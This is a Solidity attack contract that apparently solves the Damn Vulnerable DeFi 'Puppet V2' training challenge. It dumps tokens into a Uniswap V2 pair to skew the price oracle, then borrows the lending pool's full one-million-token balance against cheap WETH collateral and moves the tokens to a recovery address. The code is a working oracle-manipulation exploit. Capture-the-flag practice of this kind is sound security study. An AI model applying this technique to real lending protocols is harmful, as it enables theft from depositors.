// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {PuppetV2Pool} from "../PuppetV2Pool.sol";
import {DamnValuableToken} from "../../DamnValuableToken.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {console2} from "forge-std/console2.sol";

contract AttackPuppetV2Pool {
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;

    constructor(
        address tokenAddress,
        address wethAddress,
        address uniswapV2RouterAddress,
        address poolAddress,
        address recovery
    ) payable {
        DamnValuableToken token = DamnValuableToken(tokenAddress);
        WETH weth = WETH(payable(wethAddress));
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(uniswapV2RouterAddress);
        PuppetV2Pool pool = PuppetV2Pool(poolAddress);

        console2.log("Token balance of the attacker before swap", token.balanceOf(address(this)));
        console2.log("ETH balance of the attacker before swap", address(this).balance);

        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);

        token.approve(address(uniswapV2Router), token.balanceOf(address(this)));
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            token.balanceOf(address(this)), 0, path, address(this), block.timestamp + 300
        );

        console2.log("ETH balance of the attacker after swap", address(this).balance);
        console2.log("Token balance of the attacker after swap", token.balanceOf(address(this)));
        console2.log("WETH balance of the attacker after swap", weth.balanceOf(address(this)));

        weth.deposit{value: address(this).balance}();
        weth.approve(address(pool), weth.balanceOf(address(this)));
        console2.log("WETH balance of the attacker after deposit", weth.balanceOf(address(this)));

        pool.borrow(POOL_INITIAL_TOKEN_BALANCE);
        console2.log("Token balance of the attacker after borrow", token.balanceOf(address(this)));
        token.transfer(recovery, token.balanceOf(address(this)));
        console2.log("Token balance of the attacker after transfer", token.balanceOf(address(this)));
        console2.log("Token balance of the recovery", token.balanceOf(recovery));
        console2.log("Token balance of the pool", token.balanceOf(address(pool)));
    }
}
